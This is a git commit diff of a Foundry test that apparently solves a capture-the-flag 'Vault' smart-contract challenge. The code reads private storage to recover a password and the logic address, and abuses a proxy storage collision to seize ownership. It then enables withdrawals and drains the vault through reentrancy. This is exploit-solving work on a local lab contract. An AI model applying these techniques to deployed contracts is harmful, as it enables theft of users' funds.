a75fda3f280d17061637436004e4e8a9b210b135
check520 <sxpp316@gmail.com>
2024-11-09 01:11:54 +0800

    读取密码然后修改owner实现重入

--- test/HackCtf/Vault.t.sol
+++ test/HackCtf/Vault.t.sol
@@ -4,6 +4,16 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "@src/HackCtf/Vault.sol";
 
+// ... existing code ...
+interface IVaultLogic {
+    function changeOwner(bytes32 _password, address newOwner) external;
+}
+
+interface IVault {
+    function owner() external view returns (address);
+    function logic() external view returns (address);
+}
+
 contract VaultExploiter is Test {
     Vault public vault;
     VaultLogic public logic;
@@ -29,21 +39,54 @@ contract VaultExploiter is Test {
         logic = new VaultLogic(bytes32("0x1234"));
         vault = new Vault(address(logic));
 
-        vault.openWithdraw();
-
+        vault.deposite{value: 1 ether}();
         vm.stopPrank();
+    }
+
+    function callChangeOwner(Vault vault, bytes32 password, address newOwner) public {
+        // Encode the function signature and arguments
+        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", password, newOwner);
+
+        // Call `Vault` with the encoded data, which will use the fallback to call `VaultLogic`
+        (bool success,) = address(vault).call(data);
+        require(success, "changeOwner call failed");
     }
 
     /**
      * 重入攻击
      */
     function testExploit() public {
-        deal(address(this), 1 ether);
+        // 获取logic地址
+        address logicAddress = address(uint160(uint256(vm.load(address(vault), bytes32(uint256(1))))));
+        console.log("logicAddress", logicAddress);
+        assertEq(logicAddress, address(logic));
+        // 获取密码
+        bytes32 password = vm.load(logicAddress, bytes32(uint256(1)));
+        assertEq(password, "0x1234");
+
+        //vm.deal(palyer, 1 ether);
+        vm.startPrank(palyer);
+        // 调用changeOwner函数
+        address owner = vault.owner();
+
+        // 修改owner
+        callChangeOwner(vault, bytes32(uint256(uint160(address(logicAddress)))), palyer);
+        assertEq(vault.owner(), palyer);
+        // 打开提现
+        vault.openWithdraw();
+        assertEq(vault.canWithdraw(), true);
+
+        // 还原owner
+        callChangeOwner(vault, bytes32(uint256(uint160(address(logicAddress)))), owner);
+        vm.stopPrank();
+
+        // 执行重入
+        vm.deal(address(this), 1 ether);
+        vm.prank(address(this));
         vault.deposite{value: 1 ether}();
-        assertEq(address(vault).balance, 1 ether);
+        vm.prank(address(this));
         vault.withdraw();
         assertEq(address(vault).balance, 0);
-        vm.stopPrank();
         require(vault.isSolve(), "solved");
     }
 }
